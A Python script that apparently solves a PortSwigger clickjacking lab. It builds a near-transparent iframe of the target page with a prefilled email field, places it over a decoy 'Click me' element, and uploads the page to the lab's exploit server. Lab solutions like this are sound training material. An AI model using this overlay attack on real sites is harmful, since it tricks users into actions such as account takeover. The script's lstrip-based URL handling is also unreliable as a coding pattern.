"""
https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

site_url = f'https://{site}/'
resp = s.get(site_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

exploit_html = f'''<style>
   iframe {{
       position: relative;
       width: 700px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }}
   div {{
       position: absolute;
       top: 485px;
       left: 60px;
       z-index: 1;
   }}
</style>
<div>Click me</div>
<iframe src="https://{site}?email=baa@pdx.edu"></iframe>
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}

resp = s.post(exploit_url, data=formData)